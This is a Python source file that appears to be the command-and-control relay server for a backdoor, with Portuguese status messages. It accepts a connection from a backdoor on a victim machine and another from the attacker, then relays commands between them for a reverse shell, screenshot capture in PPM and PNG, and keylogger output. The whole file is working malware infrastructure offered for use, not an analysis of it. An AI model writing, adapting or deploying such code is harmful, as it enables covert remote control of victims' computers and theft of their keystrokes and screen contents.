import socket
from time import sleep

# Sets the IP address and ports on which the server will wait for the connection
SERVER = 'SERVER_IP'
PORT1 = SERVER_PORT1   # Backdoor
PORT2 = SERVER_PORT2   # Attacker

# Creates the TCP sockets
sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Backdoor
sock2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Attacker

# Associates the sockets with the specified IP addresses and ports
sock1.bind((SERVER, PORT1))
sock2.bind((SERVER, PORT2))

# Waits for the backdoor connection
sock1.listen(1)
print(">>> Aguardando conexão do backdoor... <<<")

# Accepts the connection and gets the socket object from the established connection
conn1, addr1 = sock1.accept()
print(">>> Conexão estabelecida com backdoor:", addr1, "<<<")

# Waits for the attacker connection
sock2.listen(1)
print(">>> Aguardando conexão do atacante... <<<")

# Accepts the connection and gets the socket object from the established connection
conn2, addr2 = sock2.accept()
print(">>> Conexão estabelecida com atacante:", addr2, "<<<")

# Main loop for sending and receiving messages
while True:
    data2 = conn2.recv(1024)
    if data2.decode('utf-8').rstrip('\n\x00') == "1":   # Reverse shell
        conn1.sendall(data2)
        while True:
            data2 = conn2.recv(1024)
            if data2.decode('utf-8').rstrip('\n\x00') == "quit":
                conn1.sendall(data2)
                break
            conn1.sendall(data2)

            fileSize = 0
            count = 0
            data1 = conn1.recv(1024)    # File size
            try:
                fileSize = int(data1.decode('utf-8').rstrip('\x00'))
            except:
                pass
            conn2.sendall(data1)
            while (count < fileSize):
                data1 = conn1.recv(1024)
                count += len(data1)
                # Redirects the received message
                conn2.sendall(data1)
        continue
    elif data2.decode('utf-8').rstrip('\n\x00') == "2": # Screenshot PPM
        conn1.sendall(data2)
        while True:
            fileSize = 0
            count = 0
            data1 = conn1.recv(1024)    # File size
            try:
                fileSize = int(data1.decode('utf-8').rstrip('\x00'))
            except:
                pass
            conn2.sendall(data1)
            while (count < fileSize):
                data1 = conn1.recv(1024)
                count += len(data1)
                # Redirects the received message
                conn2.sendall(data1)
            break
        continue
    elif data2.decode('utf-8').rstrip('\n\x00') == "3": # Screenshot PNG
        conn1.sendall(data2)
        data2 = conn2.recv(1024)
        conn1.sendall(data2)
        while True:
            fileSize = 0
            count = 0
            data1 = conn1.recv(1024)    # File size
            try:
                fileSize = int(data1.decode('utf-8').rstrip('\x00'))
            except:
                pass
            conn2.sendall(data1)
            while (count < fileSize):
                data1 = conn1.recv(1024)
                count += len(data1)
                # Redirects the received message
                conn2.sendall(data1)
            break
        continue
    elif data2.decode('utf-8').rstrip('\n\x00') == "4": # Keylogger
        conn1.sendall(data2)
        data1 = conn1.recv(1024)
        conn2.sendall(data1)
        continue
    else:   # Connection
        conn1.sendall(data2)
        break

sleep(1)

# Close the connections and the sockets
conn2.close()
sock2.close()
conn1.close()
sock1.close()